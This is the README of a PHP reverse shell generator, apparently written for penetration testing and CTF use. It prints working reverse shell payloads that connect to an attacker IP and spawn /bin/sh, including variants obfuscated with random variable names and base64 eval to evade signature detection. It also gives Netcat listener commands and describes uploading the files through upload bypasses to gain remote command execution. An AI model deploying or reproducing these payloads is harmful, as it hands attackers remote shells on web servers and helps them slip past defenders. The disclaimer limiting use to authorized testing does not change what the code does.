# PHP Reverse Shell Generator

> **For authorized security testing and educational use only.**  
> Always obtain explicit written permission before deploying reverse shells on any system.

---

## 📌 Overview

`reverse_shell_gen.py` is a lightweight, command-line Python tool designed to **generate customizable PHP reverse shell payloads**, optionally **obfuscate** them, save them with **multiple file extensions**, and **automatically launch a Netcat listener**. It is particularly useful in penetration testing, red team engagements, and Capture-The-Flag (CTF) challenges where PHP-based web shells are needed.

---

## 🛠️ Features

- **Dynamic payload generation** with user-defined attacker IP and port.
- **Multiple output extensions**: `.php`, `.phtml`, `.php3`, `.php4`, `.php5`, `.php7`, `.inc`.
- **Obfuscation options**:
  - `none`: Plain, readable PHP.
  - `basic`: Randomized variable names.
  - `base64`: Encoded payload executed via `eval(base64_decode(...))`.
- **Auto listener**: Launches `nc -nvlp <port>` after payload generation.
- **Modular design**: Easy to extend with new obfuscation or payload types.

---

## 📦 Requirements

- Python 3.6+
- Netcat (`nc`) installed (for `--listen` functionality)
- Standard library only (no external dependencies)

---

## 🚀 Usage

### Basic Syntax
```bash
python3 reverse_shell_gen.py --ip <ATTACKER_IP> [OPTIONS]
```

### Examples

#### 1. Generate a basic PHP reverse shell
```bash
python3 reverse_shell_gen.py --ip 192.168.1.10
```
> Saves `shell.php` with default port `2001`.

#### 2. Custom IP, port, filename, and auto-listener
```bash
python3 reverse_shell_gen.py --ip 10.0.0.5 --port 4444 --output rev --listen
```
> Saves `rev.php` and starts `nc -nvlp 4444`.

#### 3. Generate multiple obfuscated variants
```bash
python3 reverse_shell_gen.py --ip 172.30.97.88 --port 8080 \
  --ext php phtml php5 \
  --obfuscate base64 \
  --output webshell
```
> Creates:
> - `webshell.php`
> - `webshell.phtml`
> - `webshell.php5`  
> All encoded in Base64.

#### 4. Use basic obfuscation (random variable names)
```bash
python3 reverse_shell_gen.py --ip 127.0.0.1 --port 9001 --obfuscate basic
```

---

## ⚙️ Command-Line Arguments

| Argument | Type | Default | Description |
|--------|------|--------|-------------|
| `--ip` | string | **required** | Your attacker machine’s IP address (e.g., `192.168.45.123`) |
| `--port` | integer | `2001` | Listening port for the reverse shell |
| `--output` | string | `shell` | Base filename (extension added automatically) |
| `--ext` | list | `["php"]` | One or more PHP-compatible extensions (choices: `php`, `phtml`, `php3`, `php4`, `php5`, `php7`, `inc`) |
| `--obfuscate` | choice | `none` | Obfuscation method: `none`, `basic`, or `base64` |
| `--listen` | flag | disabled | Automatically start a Netcat listener on the specified port |

> 💡 **Tip**: Combine `--listen` with `--port` to streamline your attack workflow.

---

## 🔐 Obfuscation Methods

### 1. `none` (Default)
Generates clean, readable PHP:
```php
<?php
$ip = '192.168.1.10';
$port = 2001;
$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh', array(0 => $sock, 1 => $sock, 2 => $sock), $pipes);
?>
```

### 2. `basic`
Uses randomly generated variable names to evade basic signature detection:
```php
<?php
$aBcDeFgH = '192.168.1.10';
$iJkLmNoP = 2001;
$qRsTuVwX = fsockopen($aBcDeFgH, $iJkLmNoP);
$yZabCdeF = proc_open('/bin/sh', array(0 => $qRsTuVwX, 1 => $qRsTuVwX, 2 => $qRsTuVwX), $pipes);
?>
```

### 3. `base64`
Encodes the entire payload in Base64 and executes it via `eval`:
```php
<?php eval(base64_decode('PD9waHAKJGlwID0gJzE5Mi4xNjguMS4xMCc7CiRwb3J0ID0gMjAwMTsKJHNvY2sgPSBmc29ja29wZW4oJGlwLCAkcG9ydCk7CiRwcm9jID0gcHJvY19vcGVuKCcvYmluL3NoJywgYXJyYXkoMCA9PiAkc29jaywgMSA9PiAkc29jaywgMiA9PiAkc29jayksICRwaXBlcyk7Cj8+')); ?>
```

> ⚠️ Note: Base64 obfuscation may still be flagged by modern WAFs or EDRs that decode and inspect payloads.

---

## 🧪 Listener Behavior

When `--listen` is used:
- The script runs: `nc -nvlp <port>`
- If `nc` is not installed, it prints an error and exits gracefully.
- Press `Ctrl+C` to stop the listener.

> 🔍 Ensure your firewall allows inbound connections on the chosen port.

---

## 📁 Output Files

All payloads are saved in the **current working directory**. Example outputs:
- `shell.php`
- `rev.phtml`
- `webshell.php5`

These files can be uploaded to vulnerable web applications (e.g., via file upload bypasses) to gain remote command execution.

---

## ⚠️ Legal & Ethical Notice

This tool is intended **exclusively** for:
- Authorized penetration testing
- Security research
- Educational labs and CTF competitions

**Never use this tool against systems you do not own or lack explicit written permission to test.** Unauthorized access violates laws such as the Computer Fraud and Abuse Act (CFAA) and similar regulations worldwide.

---

## 🧩 Extending the Tool

You can enhance this script by:
- Adding more obfuscation layers (e.g., `chr()`, string reversal, gzip)
- Supporting other payload types (e.g., Python, Bash, PowerShell)
- Integrating with HTTP servers for quick payload delivery
- Adding AV evasion techniques (for red team use within legal boundaries)

---
## 🧑‍💻 Author

**Oussama Ben Hadj Dahman @cybereagle2001**  
*Junior Information Security Consultant @ TALAN*  
🔐 ISO 27001 | eJPT | CDFE | CPT | CC  

---
## 📜 License

This script is provided **as-is** with no warranty. Use responsibly and ethically.

> Developed with ❤️ for the infosec community.
